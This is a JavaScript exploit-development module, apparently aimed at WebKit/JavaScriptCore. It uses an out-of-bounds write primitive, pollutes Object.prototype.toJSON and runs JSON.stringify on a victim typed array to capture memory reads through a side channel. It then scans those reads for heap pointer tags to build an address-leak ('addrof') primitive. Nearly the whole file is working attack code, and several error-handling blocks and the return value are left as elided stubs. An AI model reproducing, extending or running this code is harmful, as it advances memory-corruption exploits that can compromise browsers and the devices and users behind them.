// js/script3/testArrayBufferVictimCrash.mjs (v62_CaptureFuzzToSideChannel)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC = "OriginalHeisenbug_TypedArrayAddrof_v62_CaptureFuzzToSideChannel";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

// Variáveis no escopo do módulo para serem acessadas pela sonda e por execute...
// Serão resetadas a cada chamada de execute...
let captured_fuzz_reads_for_AB_v62 = null;
let captured_fuzz_reads_for_DV_v62 = null;

let leak_target_buffer_v62 = null;
let leak_target_dataview_v62 = null;

let victim_typed_array_ref_v62 = null;
let probe_call_count_v62 = 0;
let all_probe_interaction_details_v62 = [];
let first_call_details_object_ref_v62 = null;

const PROBE_CALL_LIMIT_V62 = 10;
const FUZZ_OFFSETS_V62 = [0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50];

function toJSON_TA_Probe_CaptureFuzzToSideChannel_v62() {
    probe_call_count_v62++;
    const call_num = probe_call_count_v62;
    let current_call_details = {
        call_number: call_num,
        probe_variant: FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC,
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v62),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v62 && first_call_details_object_ref_v62 !== null),
        this_is_leak_target_AB: (this === leak_target_buffer_v62 && leak_target_buffer_v62 !== null),
        this_is_leak_target_DV: (this === leak_target_dataview_v62 && leak_target_dataview_v62 !== null),
        fuzz_capture_status: null,
        error_in_probe: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. Type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1? ${current_call_details.this_is_C1_details_obj}. IsLeakAB? ${current_call_details.this_is_leak_target_AB}. IsLeakDV? ${current_call_details.this_is_leak_target_DV}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V62) {
            all_probe_interaction_details_v62.push(current_call_details);
            return { recursion_stopped_v62: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating C1_details WITH PAYLOADS.`, "info");
            first_call_details_object_ref_v62 = current_call_details;
            if (leak_target_buffer_v62) current_call_details.payload_AB = leak_target_buffer_v62;
            if (leak_target_dataview_v62) current_call_details.payload_DV = leak_target_dataview_v62;
            all_probe_interaction_details_v62.push(current_call_details);
            return current_call_details;
        }
        else if (current_call_details.this_is_leak_target_AB && current_call_details.this_type === '[object ArrayBuffer]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET ArrayBuffer! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = new DataView(this);
                for (const offset of FUZZ_OFFSETS_V62) {
                    if (view.byteLength < (offset + 8)) { fuzzed_reads.push({ offset: toHex(offset), error: "OOB" }); continue; }
                    let low = view.getUint32(offset, true); let high = view.getUint32(offset + 4, true);
                    let ptr = new AdvancedInt64(low, high);
                    let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                    fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr.toString(true), dbl:(new Float64Array(tb))[0] });
                }
                captured_fuzz_reads_for_AB_v62 = fuzzed_reads; // CAPTURA PARA CANAL LATERAL
                current_call_details.fuzz_capture_status = `AB Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v62.push(current_call_details);
                return { marker_ab_fuzz_done_v62: true, call_num_processed: call_num }; // Retorno simples
            } catch (e) { /* ... (tratamento de erro similar ao v61) ... */ }
        }
        else if (current_call_details.this_is_leak_target_DV && current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS THE TARGET DataView! Fuzzing and capturing to side-channel...`, "critical");
            let fuzzed_reads = [];
            try {
                let view = this;
                for (const offset of FUZZ_OFFSETS_V62) {
                    if (view.byteLength < (offset + 8)) { fuzzed_reads.push({ offset: toHex(offset), error: "OOB" }); continue; }
                    let low = view.getUint32(offset, true); let high = view.getUint32(offset + 4, true);
                    let ptr = new AdvancedInt64(low, high);
                    let tb = new ArrayBuffer(8); (new Uint32Array(tb))[0]=low; (new Uint32Array(tb))[1]=high;
                    fuzzed_reads.push({ offset: toHex(offset), low:toHex(low), high:toHex(high), int64:ptr.toString(true), dbl:(new Float64Array(tb))[0] });
                }
                captured_fuzz_reads_for_DV_v62 = fuzzed_reads; // CAPTURA PARA CANAL LATERAL
                current_call_details.fuzz_capture_status = `DV Fuzz captured ${fuzzed_reads.length} reads.`;
                logS3(`[${current_call_details.probe_variant}] ${current_call_details.fuzz_capture_status}`, "vuln");
                all_probe_interaction_details_v62.push(current_call_details);
                return { marker_dv_fuzz_done_v62: true, call_num_processed: call_num }; // Retorno simples
            } catch (e) { /* ... (tratamento de erro similar ao v61) ... */ }
        }
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is C1_details_obj (re-entry or unexpected). Not modifying.`, "warn");
            all_probe_interaction_details_v62.push(current_call_details);
            return this;
        } else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected: ${current_call_details.this_type}.`, "warn");
            all_probe_interaction_details_v62.push(current_call_details);
            return `GenericMarker_Call${call_num}_Type${current_call_details.this_type.replace(/[^a-zA-Z0-9]/g, '')}`;
        }
    } catch (e_probe) {
        current_call_details.error_in_probe = e_probe.message;
        const FNAME_REF = FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC;
        logS3(`[${FNAME_REF}] Probe Call #${call_num}: CRIT ERR: ${e_probe.name} - ${e_probe.message}`, "critical", FNAME_REF);
        all_probe_interaction_details_v62.push(current_call_details);
        return { error_marker_v62: call_num, error_msg: e_probe.message };
    }
}

export async function executeTypedArrayVictimAddrofTest_CaptureFuzzToSideChannel() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (CaptureFuzzToSideChannel) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC} Init...`;

    // Resetar variáveis de captura a cada execução
    captured_fuzz_reads_for_AB_v62 = null;
    captured_fuzz_reads_for_DV_v62 = null;
    probe_call_count_v62 = 0;
    all_probe_interaction_details_v62 = [];
    victim_typed_array_ref_v62 = null;
    first_call_details_object_ref_v62 = null;

    leak_target_buffer_v62 = new ArrayBuffer(0x80);
    leak_target_dataview_v62 = new DataView(new ArrayBuffer(0x80));

    let errorCapturedMain = null;
    let rawStringifyOutput = "N/A";
    let stringifyOutput_parsed = null; // O output parseado pode ser menos relevante agora

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default (v62)" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default (v62)" };

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);
        victim_typed_array_ref_v62 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CaptureFuzzToSideChannel_v62, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v62)...`, "info", FNAME_CURRENT_TEST);
            rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v62); // Output principal
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try { stringifyOutput_parsed = JSON.parse(rawStringifyOutput); } catch (e) { /* ignora erro de parse aqui */ }


            logS3("STEP 3: Analyzing fuzz data captured in side-channels (v62)...", "warn", FNAME_CURRENT_TEST);
            let heisenbugIndication = false;

            const process_captured_fuzz_reads = (fuzzed_reads_array, target_addrof_result, objTypeName) => {
                if (fuzzed_reads_array && Array.isArray(fuzzed_reads_array)) {
                    heisenbugIndication = true; // Indica que o TypedArray alvo se tornou 'this'
                    logS3(`  V62_ANALYSIS: Processing captured fuzz data for ${objTypeName}. Count: ${fuzzed_reads_array.length}`, "good");
                    for (const read_attempt of fuzzed_reads_array) {
                        if (read_attempt.error) {
                            logS3(`    Offset ${read_attempt.offset}: Error - ${read_attempt.error}`, "warn");
                            continue;
                        }
                        logS3(`    Offset ${read_attempt.offset}: Low=${read_attempt.low}, High=${read_attempt.high}, Int64=${read_attempt.int64}, Double=${read_attempt.dbl}`, "dev_verbose");
                        const highVal = parseInt(read_attempt.high, 16);
                        const lowVal = parseInt(read_attempt.low, 16);
                        if ( (highVal === JSC_OFFSETS.JSValue.HEAP_POINTER_TAG_HIGH && (lowVal & JSC_OFFSETS.JSValue.TAG_MASK) === JSC_OFFSETS.JSValue.CELL_TAG) ||
                             (highVal > 0x10000 && highVal < 0x90000000) && ((lowVal & 0xF) === 0) ) {
                            target_addrof_result.success = true;
                            target_addrof_result.msg = `V62 SUCCESS (${objTypeName} Fuzz Read): Potential Ptr ${read_attempt.int64} from offset ${read_attempt.offset}`;
                            logS3(`  !!!! V62 POTENTIAL POINTER FOUND for ${objTypeName} at offset ${read_attempt.offset}: ${read_attempt.int64} !!!!`, "vuln");
                            break;
                        }
                    }
                    if (!target_addrof_result.success) {
                        target_addrof_result.msg = `V62 Fuzzed reads for ${objTypeName} (from side-channel) did not yield a clear pointer.`;
                    }
                } else if (!target_addrof_result.success) {
                     target_addrof_result.msg = `V62 No fuzz data captured in side-channel for ${objTypeName}.`;
                }
            };

            process_captured_fuzz_reads(captured_fuzz_reads_for_AB_v62, addrof_A_result, "ArrayBuffer");
            process_captured_fuzz_reads(captured_fuzz_reads_for_DV_v62, addrof_B_result, "DataView");

            // Se heisenbugIndication não foi setado, verificar se C1 foi populado
            if (!heisenbugIndication && first_call_details_object_ref_v62) {
                const c1 = first_call_details_object_ref_v62;
                if (c1.payload_AB === leak_target_buffer_v62 || c1.payload_DV === leak_target_dataview_v62) {
                    heisenbugIndication = true;
                     logS3(`  V62_ANALYSIS: C1_details was populated with payloads. Target TypedArray did not become 'this' or fuzz data issue.`, "info");
                }
            }


            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC}: Addr SUCCESS!`;
            } else if (heisenbugIndication) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC}: Heisenbug OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V62_CFTSC}: No Heisenbug?`;
            }

        } catch (e_str_outer) { /* ... (tratamento de erro similar ao v61) ... */ }
        finally { /* ... (restauração do toJSON) ... */ }
    } catch (e_overall_main) { /* ... (tratamento de erro similar ao v61) ... */ }
    finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v62}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v62 = null;
        all_probe_interaction_details_v62 = [];
        probe_call_count_v62 = 0;
        first_call_details_object_ref_v62 = null;
        leak_target_buffer_v62 = null;
        leak_target_dataview_v62 = null;
        captured_fuzz_reads_for_AB_v62 = null; // Limpar
        captured_fuzz_reads_for_DV_v62 = null; // Limpar
    }
    return { /* ... (objeto de resultado similar ao v61) ... */ };
};
